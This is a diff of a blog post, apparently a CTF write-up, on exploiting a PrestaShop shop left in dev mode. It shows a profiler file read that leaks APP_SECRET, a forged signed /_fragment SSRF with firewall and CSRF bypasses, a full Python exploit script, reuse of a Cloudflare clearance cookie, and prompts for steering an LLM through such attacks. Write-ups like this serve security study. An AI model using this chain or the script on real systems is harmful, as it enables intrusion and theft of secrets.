@@ -7,7 +7,7 @@
     <meta name="color-scheme" content="dark">
 
     <title>Anime Shop — LazyBlog</title>
-    <meta name="description" content="PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service.">
+    <meta name="description" content="PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag.">
             <meta name="author" content="tungdlm99">
         <meta name="generator" content="LazyBlog 1.11.0">
     <meta name="robots" content="index, follow, max-image-preview:large">
@@ -16,7 +16,7 @@
 
     <!-- Open Graph -->
     <meta property="og:title" content="Anime Shop">
-    <meta property="og:description" content="PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service.">
+    <meta property="og:description" content="PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag.">
     <meta property="og:url" content="https://doantung99.github.io/blog/posts/anime-shop">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="LazyBlog">
@@ -31,7 +31,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Anime Shop">
-    <meta name="twitter:description" content="PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service.">
+    <meta name="twitter:description" content="PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag.">
         
     <!-- Alternates: machine-readable / AI / RSS -->
             <link rel="alternate" type="text/markdown" href="https://doantung99.github.io/blog/posts/anime-shop.md">
@@ -41,7 +41,7 @@
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20fill%3D%22%230a0e0a%22%2F%3E%3Ctext%20x%3D%224%22%20y%3D%2224%22%20font-family%3D%22monospace%22%20font-size%3D%2222%22%20fill%3D%22%2339ff14%22%3E%26gt%3B_%3C%2Ftext%3E%3C%2Fsvg%3E">
 
-            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Anime Shop","description":"PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/anime-shop","mainEntityOfPage":"https://doantung99.github.io/blog/posts/anime-shop","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
+            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Anime Shop","description":"PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/anime-shop","mainEntityOfPage":"https://doantung99.github.io/blog/posts/anime-shop","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
     
     <script>
     // Theme bootstrap — server already rendered the configured default on
@@ -74,7 +74,7 @@
 </div>
 
 <header>
-            <div class="callsign">XV5HP // MAYLAB // HẢI PHÒNG</div>
+            <div class="callsign">NAB // Hà Nội</div>
                     <p class="site-brand"><a href="/blog/" class="brand-link">LazyBlog</a></p>
                 <div class="subtitle">// A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</div>
         <div class="header-actions">
@@ -112,25 +112,122 @@
     
             <nav class="toc toc-inline" aria-label="Table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#reading-the-room-before-reading-the-code">Reading the room before reading the code</a></li><li class="level-3"><a href="#architecture-where-the-flag-actually-is">Architecture: where the flag actually is</a></li><li class="level-3"><a href="#dead-end-1-the-report-bot-is-a-trap-and-i-had-to-stop-the-model-chasing-it">Dead-end #1: the report bot is a trap (and I had to stop the model chasing it)</a></li><li class="level-3"><a href="#the-dev-mode-foothold-an-unauthenticated-profiler">The dev-mode foothold: an unauthenticated profiler</a></li><li class="level-3"><a href="#step-1-profiler-open-action-arbitrary-file-read-app-secret">Step 1 — profiler open action → arbitrary file read → APP_SECRET</a></li><li class="level-3"><a href="#step-2-app-secret-a-signed-fragment-call">Step 2 — APP_SECRET → a signed /_fragment call</a></li><li class="level-3"><a href="#two-gotchas-that-cost-real-time">Two gotchas that cost real time</a></li><li class="level-3"><a href="#the-end-to-end-exploit">The end-to-end exploit</a></li><li class="level-3"><a href="#the-chain-end-to-end">The chain, end to end</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     
     <div class="post-body">
         <h2 id="summary">Summary</h2>
-<p>The shop was PrestaShop 9.1.4 deployed from the GitHub <em>source</em> tree instead of a packaged release, so <code>_PS_MODE_DEV_</code> was left <code>true</code>. That gave an unauthenticated Symfony Web Profiler (arbitrary file read → <code>APP_SECRET</code>), which I used to forge a signed <code>/_fragment</code> request and turn it into an unauthenticated SSRF that reflected the flag from an internal-only HTTP service.</p>
+<p>Anime Shop is a PrestaShop 9.1.4 storefront deployed straight from the GitHub <em>source</em> tree instead of a hardened release, which silently leaves <code>_PS_MODE_DEV_ = true</code>. That single mistake unlocks a full chain: an unauthenticated Symfony Web Profiler gives arbitrary file-read to leak <code>APP_SECRET</code>, the secret lets you forge a signed <code>/_fragment</code> request, and request-attribute injection through <code>_path</code> bypasses PrestaShop's admin firewall and CSRF listener to invoke <code>Tools::file_get_contents('http://internal:5000/admin')</code> server-side. The flag lives only on an internal Docker-network service, so the dev-mode exception page that reflects the controller's return value <em>is</em> the exfil channel.</p>
+<p>This is a writeup about how I drove an LLM through that chain. I want to be honest about the division of labor: the model did almost all of the grinding — reading the PrestaShop source, finding the exact listener conditions, reconstructing the <code>UriSigner</code> HMAC, writing the script. My job was recognizing the challenge class from the hint, feeding it the right artifacts, killing the wrong rabbit holes it kept wandering into, and verifying every claim before I trusted it. The interesting content here is the <em>steering</em>, so I've kept a &quot;Lessons learned&quot; section at the end that is more concrete than the usual hand-wave.</p>
 <h2 id="solution">Solution</h2>
-<p>This one was a chain, so my job was mostly direction and verification while the model ground through the PrestaShop/Symfony internals.</p>
-<ol>
-<li>
-<p><strong>Set the direction from the theme.</strong> The hint &quot;quit <em>VCS</em> to open a shop&quot; plus a Dockerfile that pulls the GitHub source archive told me this was a <em>deployed-from-source-leaves-dev-mode-on</em> bug. I had the model confirm <code>_PS_MODE_DEV_ = true</code> and check what dev mode unlocks: the unauthenticated profiler (the admin firewall explicitly excludes <code>^/(_(profiler|wdt)…</code>), verbose exception pages, and the <code>/_fragment</code> endpoint. It first wandered toward the customer report bot as an XSS path; I pushed back because the internal flag service sends no CORS headers, so a browser on the <code>app</code> origin can't read it cross-origin — the read had to be server-side. That pivot was the whole game.</p>
-</li>
-<li>
-<p><strong>Leak the secret, then have the model build the fragment.</strong> I pointed it at the profiler's <code>open</code> action to read <code>app/config/parameters.php</code> and pull out <code>APP_SECRET</code>. Then I asked it to assemble a <code>/_fragment</code> request signed with that secret, steering it onto the two PrestaShop bypasses I knew it would need: <code>_anonymous_controller=1</code> (the firewall's <code>==</code> is a loose comparison, so <code>&quot;1&quot; == true</code>) and <code>_route=_x</code> (the CSRF listener bails when the route name starts with <code>_</code>). The gadget is <code>Tools::file_get_contents</code> against the internal URL — it returns a <em>string</em>, so dev mode throws <code>ControllerDoesNotReturnResponseException</code> and embeds the returned value (the flag) in the error page.</p>
-</li>
-<li>
-<p><strong>Catch the signing gotcha and verify.</strong> The model's first signatures <code>500</code>'d. I recognized the cause: the origin sits behind Cloudflare with no trusted proxies, so it sees plain <code>http://</code> and <code>UriSigner</code> must sign over <code>http://HOST...</code>, not <code>https://</code>. After reusing a <code>cf_clearance</code> cookie with the matching Firefox UA, the request returned the flag and I confirmed the format.</p>
-</li>
-</ol>
+<h3 id="reading-the-room-before-reading-the-code">Reading the room before reading the code</h3>
+<p>The challenge text is the whole thesis: <em>&quot;Bro quit <strong>vcs</strong> to open an Anime Shop, can you break it?&quot;</em> That word &quot;vcs&quot; is doing a lot of work. It is both a callback (the author left their previous gig) and the literal vulnerability: the shop was deployed from <strong>version control</strong> — the raw GitHub source — rather than from a packaged release. I clocked that immediately and it became the hypothesis I steered the model toward, because the difference between PrestaShop's source tree and its release package is exactly <em>dev mode</em>.</p>
+<p>I set the model up with that framing rather than letting it brute-force around:</p>
+<blockquote>
+<p>&quot;This is PrestaShop. The challenge hint is 'quit VCS to open a shop' — I think it means the app was deployed from the GitHub source tree, not a release package. In the source tree, what does <code>config/defines.inc.php</code> set <code>_PS_MODE_DEV_</code> to, and what does dev mode expose in the Symfony admin app? List concrete attack surface.&quot;</p>
+</blockquote>
+<p>That prompt did two things at once: it gave the model the <em>theory of the case</em> (source-tree deploy → dev mode), and it asked for <strong>concrete attack surface</strong> rather than a lecture. The answer came back clean: the source-tree <code>defines.inc.php</code> leaves dev mode on, and dev mode turns on the Web Profiler, verbose exception pages, and the <code>/_fragment</code> endpoint. Three primitives, and they compose.</p>
+<h3 id="architecture-where-the-flag-actually-is">Architecture: where the flag actually is</h3>
+<p>The compose file ships four services:</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>app</code></td>
+<td>PrestaShop 9.1.4 (Ubuntu 24.04, Apache + PHP 8.3), publicly exposed</td>
+</tr>
+<tr>
+<td><code>db</code></td>
+<td>MariaDB 10.11</td>
+</tr>
+<tr>
+<td><code>internal</code></td>
+<td>tiny Node HTTP service holding the <strong>FLAG</strong>, Docker-network only</td>
+</tr>
+<tr>
+<td><code>bot</code></td>
+<td>Puppeteer/Firefox &quot;report&quot; bot that logs in as a <em>customer</em> and visits a submitted path</td>
+</tr>
+</tbody>
+</table>
+<p>The flag handler in <code>internal/server.js</code> is blunt:</p>
+<pre><code class="language-js">if (url.pathname === '/admin') {
+  writeRaw(res, 200, process.env.FLAG || 'v1t{dummy_dummy}');
+  return;
+}
+</code></pre>
+<p>So the flag is at <code>http://internal:5000/admin</code>, and <code>internal</code> is only reachable from <em>inside</em> the Docker network — from <code>app</code> or <code>bot</code>. That constraint is the spine of the whole challenge: whatever I do, the final read has to happen server-side. No amount of client-side cleverness reaches <code>internal</code> from my laptop.</p>
+<h3 id="dead-end-1-the-report-bot-is-a-trap-and-i-had-to-stop-the-model-chasing-it">Dead-end #1: the report bot is a trap (and I had to stop the model chasing it)</h3>
+<p>This is the first place the model wanted to be helpful in the wrong direction. A &quot;report&quot; bot that logs in and visits a path <em>screams</em> XSS to any model trained on CTF writeups, and it immediately drafted an XSS-to-<code>fetch</code> exfil plan. I made it test the assumption instead of acting on it:</p>
+<blockquote>
+<p>&quot;Before we write any XSS, check feasibility: the bot is a browser on the <code>app</code> origin. The flag is on <code>internal:5000</code> with NO CORS headers. Can a page on the <code>app</code> origin read <code>http://internal:5000/admin</code> cross-origin? Reason through CORS modes (<code>cors</code>, <code>no-cors</code>, opaque responses) and tell me if exfil is even possible.&quot;</p>
+</blockquote>
+<p>Forcing that reasoning produced the right conclusion: the flag service sets <strong>no CORS headers</strong>, so a browser on the <code>app</code> origin can fetch but never <em>read</em> the cross-origin body. I confirmed it empirically by hosting a probe on the app origin and submitting it to the bot — every mode fails:</p>
+<pre><code>cors_err  = NetworkError when attempting to fetch resource.   (blocked)
+nocors    = len0                                              (opaque, unreadable)
+scripterr = Script error.                                     (sanitized)
+</code></pre>
+<p>The customer bot is a red herring relative to the intended path. The flag must be read <strong>from <code>app</code>, server-side</strong>. Killing this branch early saved a lot of wasted effort — the model would happily have spent the whole session perfecting an XSS that physically cannot exfiltrate.</p>
+<h3 id="the-dev-mode-foothold-an-unauthenticated-profiler">The dev-mode foothold: an unauthenticated profiler</h3>
+<p>PrestaShop mounts its Symfony admin under <code>/admin-dev</code>, and the admin firewall <em>intentionally</em> leaves the profiler unauthenticated — that's normal for dev, catastrophic in prod:</p>
+<pre><code class="language-yaml"># app/config/admin/security.yml
+firewalls:
+  - pattern: ^/(_(profiler|wdt)|css|images|js)/
+    security: false
+</code></pre>
+<p>The tell is that every admin response carries a profiler token header. Hit the login page, grab the token, open the profiler — no auth required:</p>
+<pre><code>GET /admin-dev/login          -&gt; X-Debug-Token-Link: /admin-dev/_profiler/&lt;token&gt;
+GET /admin-dev/_profiler/&lt;t&gt;  -&gt; 200 (no auth)
+</code></pre>
+<p>I verified dev mode was genuinely on (not just my theory) by reading the profiler's own config panel, which showed <code>use_debug_toolbar =&gt; true</code>. That confirmation mattered: the entire rest of the chain is predicated on dev mode, so I wanted a positive signal, not an inference, before investing in <code>/_fragment</code>.</p>
+<h3 id="step-1-profiler-open-action-arbitrary-file-read-app-secret">Step 1 — profiler <code>open</code> action → arbitrary file read → <code>APP_SECRET</code></h3>
+<p>The Web Profiler ships an &quot;open file&quot; route used by the toolbar to jump to source in your editor. It reads any file under the project directory. It does block <code>..</code> traversal and dotfiles, but <code>app/config/parameters.php</code> is a perfectly ordinary in-tree path — and that's where PrestaShop stores its secrets:</p>
+<pre><code>GET /admin-dev/_profiler/open?file=app/config/parameters.php&amp;line=1
+</code></pre>
+<p>The response is highlighted source HTML; strip the markup and you have the parameters:</p>
+<pre><code>secret            = vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH
+cookie_key        = 0RMNEAJVwySnFrCIV83Osz5V0dii47SxkpKO8You3MVoa1T3GJ5cQXKBLhVQXsV4
+database_password = change_db_password_7f3b1c9e
+</code></pre>
+<p>The DB password is a decoy — it was rotated and <code>db</code> isn't externally reachable anyway. The prize is <code>secret</code>, the Symfony <code>APP_SECRET</code>. Everything downstream is signed with it.</p>
+<h3 id="step-2-app-secret-a-signed-fragment-call">Step 2 — <code>APP_SECRET</code> → a signed <code>/_fragment</code> call</h3>
+<p>Symfony's <code>FragmentListener</code> renders an arbitrary controller via <code>/_fragment?_path=…</code>, but the request must carry a valid <code>_hash</code> — an HMAC-SHA256 of the full request URI keyed by <code>APP_SECRET</code>, computed by <code>UriSigner</code>. Now that I have the secret, I can sign anything I want.</p>
+<p>The crucial detail — and the thing the model needed to be pointed at — is <em>how <code>_path</code> is parsed</em>. Symfony runs it through <code>parse_str()</code>, and the resulting keys are <strong>merged into the request attributes</strong>. That merge is the lever: it lets me inject the <em>internal</em> attributes that PrestaShop's security listeners inspect. So <code>_path</code> isn't just &quot;pick a controller,&quot; it's &quot;pick a controller <em>and</em> forge the request attributes that gate it.&quot;</p>
+<p>PrestaShop wraps the Symfony admin in two protective listeners. I have to defeat both, and <code>_path</code> injection defeats both.</p>
+<p><strong>Bypass A — the admin firewall.</strong> The access control in <code>security.yml</code> requires authentication <em>unless</em> the request is flagged as an anonymous controller:</p>
+<pre><code class="language-yaml">- { path: ^/, roles: IS_AUTHENTICATED,
+    allow_if: 'request.attributes.has(&quot;_anonymous_controller&quot;)
+               and request.attributes.get(&quot;_anonymous_controller&quot;) == true' }
+</code></pre>
+<p>This is an ExpressionLanguage expression, and <code>==</code> there is a <strong>loose</strong> comparison. The model's first instinct was to inject <code>_anonymous_controller=true</code> (a literal boolean), which is wrong — values coming through <code>parse_str()</code> are <em>strings</em>. I corrected it: inject <code>_anonymous_controller=1</code>, the string <code>&quot;1&quot;</code>, and let loose typing do the work — <code>&quot;1&quot; == true</code> evaluates true, so the request is treated as anonymous. No login.</p>
+<p><strong>Bypass B — the CSRF &quot;compromised&quot; page.</strong> PrestaShop's <code>TokenizedUrlsListener</code> redirects any admin URL lacking a valid token to <code>/admin-dev/security/compromised</code>, <em>unless</em> the route name starts with <code>_</code> (or <code>api_</code>):</p>
+<pre><code class="language-php">$route = $request-&gt;get('_route');
+if (str_starts_with($route, '_') || str_starts_with($route, 'api_')) {
+    return; // skip the token check
+}
+</code></pre>
+<p>So I inject <code>_route=_x</code> through <code>_path</code>. The listener sees a route beginning with <code>_</code> and bails out before it can redirect me. (The model initially missed this listener entirely and got a 302 to <code>/security/compromised</code>; the redirect itself was the clue that told me to go find a second gate.)</p>
+<p><strong>The gadget.</strong> With both gates open, I point the fragment at a method that takes a URL and returns its contents. PrestaShop's <code>Tools::file_get_contents</code> is perfect — Symfony resolves <code>Tools::file_get_contents</code> by instantiating <code>Tools</code> and calling the method, binding arguments from request attributes <em>by name</em>, so an attribute <code>url=...</code> is passed straight in:</p>
+<pre><code>_path = _controller=Tools::file_get_contents
+        &amp;url=http://internal:5000/admin
+        &amp;_anonymous_controller=1
+        &amp;_route=_x
+</code></pre>
+<p>Here's the elegant part, and the reason dev mode is load-bearing twice over. <code>Tools::file_get_contents()</code> returns a <strong>string</strong>, not a <code>Response</code> object. In production Symfony would just 500 with a generic message. In <em>dev</em> mode it throws <code>ControllerDoesNotReturnResponseException</code> and renders a verbose error page that <strong>embeds the offending return value</strong>:</p>
+<pre><code>The controller must return a &quot;...\Response&quot; object but it returned
+a string (&quot;v1t{...}&quot;). (500 Internal Server Error)
+</code></pre>
+<p>So the SSRF response body — the flag fetched from <code>internal:5000</code> — gets reflected straight back into my exception page. No XSS, no admin login, no second request. The dev-mode error handler is the exfiltration primitive.</p>
+<h3 id="two-gotchas-that-cost-real-time">Two gotchas that cost real time</h3>
+<p><strong>The signing scheme: <code>http://</code> not <code>https://</code>.</strong> The live site sits behind Cloudflare, and the origin has <strong>no trusted proxies configured</strong>. That means the origin sees the connection as plain <code>http://</code>, and <code>UriSigner</code> signs <code>$request-&gt;getUri()</code> — the URI <em>as the origin sees it</em>. So the HMAC must be computed over <code>http://animeshop.v1t.site/admin-dev/_fragment?...</code>, even though I'm connecting over HTTPS. The model defaulted to signing the <code>https://</code> URL I was actually hitting and got a <code>500</code> (invalid signature) every time. The fix is counterintuitive enough that I had to spell it out: <em>sign the http scheme, send over https.</em> Once I did, the signature validated.</p>
+<p><strong>Cloudflare's managed challenge.</strong> Any automated client gets a <code>403 &quot;Just a moment…&quot;</code>. I solved this the boring way: pass the challenge once in a real Firefox window, then reuse the <code>cf_clearance</code> cookie <em>with the exact same Firefox User-Agent</em>. A UA mismatch invalidates the cookie, so the UA and the cookie are a matched pair in the script.</p>
+<h3 id="the-end-to-end-exploit">The end-to-end exploit</h3>
+<p>One script, challenge data to printed flag. Plug in the leaked secret and a fresh <code>cf_clearance</code>:</p>
 <pre><code class="language-python">#!/usr/bin/env python3
 import hashlib, hmac, base64, urllib.request, urllib.error, urllib.parse as up, re
 
@@ -140,15 +237,21 @@ CF     = '&lt;cf_clearance from a real browser&gt;'
 UA     = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
 PATH   = '/admin-dev/_fragment'
 
+# Request attributes injected via _path (parse_str -&gt; merged into attributes):
+#   _controller             -&gt; the gadget (Tools::file_get_contents, returns a string)
+#   url                     -&gt; bound to the method arg by name; our internal SSRF target
+#   _anonymous_controller=1 -&gt; loose &quot;1&quot; == true bypasses the admin firewall
+#   _route=_x               -&gt; route starting with &quot;_&quot; skips the CSRF TokenizedUrlsListener
 infos = {
     '_controller': 'Tools::file_get_contents',
     'url': 'http://internal:5000/admin',
-    '_anonymous_controller': '1',   # bypass firewall (loose ==)
-    '_route': '_x',                 # skip TokenizedUrlsListener CSRF
+    '_anonymous_controller': '1',
+    '_route': '_x',
 }
 qs = '?_path=' + up.quote_plus(up.urlencode(infos))
 
-# origin sees http:// (no trusted proxies), so sign over http://HOST
+# Origin has no trusted proxies, so it sees http:// -&gt; UriSigner signs the http URI.
+# Sign over http://, but actually connect over https://.
 sign_base = f'http://{HOST}{PATH}{qs}'
 h = base64.b64encode(hmac.new(SECRET.encode(), sign_base.encode(), hashlib.sha256).digest())
 url = f'https://{HOST}{PATH}{qs}&amp;_hash=' + up.quote(h).replace('/', '%2F')
@@ -157,17 +260,54 @@ req = urllib.request.Request(url, headers={'User-Agent': UA, 'Cookie': f'cf_clea
 try:
     body = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace')
 except urllib.error.HTTPError as e:
-    body = e.read().decode('utf-8', 'replace')
+    body = e.read().decode('utf-8', 'replace')  # the 500 page IS the channel
 
+# The dev-mode exception page reflects the returned string (HTML-escaped quotes).
 m = re.search(r'it returned a string \(&amp;quot;(.*?)&amp;quot;\)', body)
 print('FLAG:', m.group(1) if m else 'not found')
 </code></pre>
 <pre><code>$ python3 solve.py
 FLAG: v1t{twinky_winky_tini_tiny_duck}
 </code></pre>
+<h3 id="the-chain-end-to-end">The chain, end to end</h3>
+<pre><code>Deployed from VCS source  ─►  _PS_MODE_DEV_ = true
+                              │
+                              ├─ unauth Symfony Web Profiler (/admin-dev/_profiler)
+                              │     └─ open?file=app/config/parameters.php  ─►  APP_SECRET
+                              │
+                              └─ /_fragment enabled
+                                    │  sign with APP_SECRET  (over http://, not https://)
+                                    │  _anonymous_controller=1   (loose == bypasses firewall)
+                                    │  _route=_x                 (skip CSRF listener)
+                                    │  _controller=Tools::file_get_contents
+                                    │  url=http://internal:5000/admin
+                                    ▼
+                              dev exception reflects returned string  ─►  FLAG
+</code></pre>
 <h2 id="flag">Flag</h2>
 <pre><code>v1t{twinky_winky_tini_tiny_duck}
 </code></pre>
+<h2 id="lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</h2>
+<p>This is the part I actually want to pass on. The chain above has four moving parts and three near-identical-looking dead ends; an LLM can find every piece but will confidently take wrong turns at each fork. The skill is steering, and it's reusable for the whole class of <em>&quot;framework deployed in dev mode → signed-endpoint abuse&quot;</em> challenges (Symfony/<code>/_fragment</code>, Laravel debug, Rails, Flask <code>/console</code>, etc.).</p>
+<p><strong>1. Lead with the theory of the case, ask for attack <em>surface</em>, not prose.</strong> The hint encoded the bug. Handing the model the hypothesis instead of the raw target focuses it instantly:</p>
+<blockquote>
+<p>&quot;This is PrestaShop. The hint 'quit VCS to open a shop' means it was deployed from the GitHub source tree, not a release package. In the source tree, what does <code>config/defines.inc.php</code> set <code>_PS_MODE_DEV_</code> to, and what does dev mode expose in the Symfony admin? List concrete attack surface.&quot;</p>
+</blockquote>
+<p>The &quot;list concrete attack surface&quot; framing is what turns a chatty model into one that enumerates <em>primitives</em> (profiler, verbose exceptions, <code>/_fragment</code>).</p>
+<p><strong>2. Make it test feasibility before it builds anything.</strong> The report bot is the trap, and every model wants to write XSS for it. Force the physics check first:</p>
+<blockquote>
+<p>&quot;Before any XSS: the bot is a browser on the <code>app</code> origin; the flag service sets NO CORS headers. Can a page on <code>app</code> read <code>http://internal:5000/admin</code> cross-origin? Reason through <code>cors</code>/<code>no-cors</code>/opaque responses and tell me if exfil is even possible.&quot;</p>
+</blockquote>
+<p>That one prompt killed a multi-hour dead end. The model concluded — correctly — that exfil is impossible and the read must be server-side.</p>
+<p><strong>3. When a gate fails, feed the <em>exact</em> error back and demand the specific source condition.</strong> This is how I caught the model's three mistakes:</p>
+<ul>
+<li>It injected <code>_anonymous_controller=true</code> (boolean). I pasted the firewall expression and asked, &quot;Values from <code>parse_str()</code> are strings — given a <em>loose</em> <code>==</code> in ExpressionLanguage, what literal value makes <code>X == true</code> true?&quot; → <code>&quot;1&quot;</code>.</li>
+<li>It got a <code>302</code> to <code>/security/compromised</code> and started guessing. I pasted the redirect and said, &quot;Something is redirecting authenticated-looking admin requests. Find the listener that does this and the <em>exact</em> condition under which it does NOT redirect.&quot; → <code>TokenizedUrlsListener</code>, <code>_route</code> starting with <code>_</code>.</li>
+<li>It signed the <code>https://</code> URL and got <code>500</code> forever. I gave it the deploy fact, &quot;origin is behind Cloudflare with no trusted proxies,&quot; and asked &quot;what scheme does <code>UriSigner</code> see in <code>$request-&gt;getUri()</code>?&quot; → sign over <code>http://</code>.</li>
+</ul>
+<p><strong>Tell the model to focus on:</strong> the <em>difference</em> between the framework's source tree and its release package (that's the whole bug); how the signed endpoint parses its path parameter and whether those keys reach request attributes; the framework's own security listeners and their <em>negative</em> conditions (what makes them skip). <strong>Tell it to AVOID:</strong> the report bot / XSS branch (no CORS = no exfil), the rotated DB password (decoy), and assuming HTTPS at the origin behind a proxy.</p>
+<p><strong>How I verified instead of trusting:</strong> I never accepted a &quot;this should work&quot; — I required a positive signal at each stage. Dev mode: confirmed via <code>use_debug_toolbar =&gt; true</code> in the profiler config, not inferred from the hint. File read: confirmed the actual <code>secret</code> string came back, not a 403. Each bypass: judged by the <em>HTTP status transition</em> — <code>302</code> → found a listener, <code>500</code> invalid-signature → wrong scheme, <code>500</code> <code>ControllerDoesNotReturnResponse</code> → success, because that specific 500 is the one that carries the flag.</p>
+<p><strong>Fast-path prompt recipe for next time:</strong> <em>&quot;Framework X is deployed from source/dev mode. Enumerate dev-only endpoints (profiler/fragment/console). For the signed one, show how its path param maps to request attributes, then list every security listener guarding the admin and the exact condition each one SKIPS — I'll inject attributes to hit all the skips. Sign with the leaked APP_SECRET over the scheme the origin actually sees behind the proxy.&quot;</em></p>
     </div>
 
     
@@ -189,7 +329,7 @@ FLAG: v1t{twinky_winky_tini_tiny_duck}
     <aside class="post-toc-wrap" aria-hidden="true">
         <nav class="toc" aria-label="Floating table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#reading-the-room-before-reading-the-code">Reading the room before reading the code</a></li><li class="level-3"><a href="#architecture-where-the-flag-actually-is">Architecture: where the flag actually is</a></li><li class="level-3"><a href="#dead-end-1-the-report-bot-is-a-trap-and-i-had-to-stop-the-model-chasing-it">Dead-end #1: the report bot is a trap (and I had to stop the model chasing it)</a></li><li class="level-3"><a href="#the-dev-mode-foothold-an-unauthenticated-profiler">The dev-mode foothold: an unauthenticated profiler</a></li><li class="level-3"><a href="#step-1-profiler-open-action-arbitrary-file-read-app-secret">Step 1 — profiler open action → arbitrary file read → APP_SECRET</a></li><li class="level-3"><a href="#step-2-app-secret-a-signed-fragment-call">Step 2 — APP_SECRET → a signed /_fragment call</a></li><li class="level-3"><a href="#two-gotchas-that-cost-real-time">Two gotchas that cost real time</a></li><li class="level-3"><a href="#the-end-to-end-exploit">The end-to-end exploit</a></li><li class="level-3"><a href="#the-chain-end-to-end">The chain, end to end</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     </aside>
 </main>
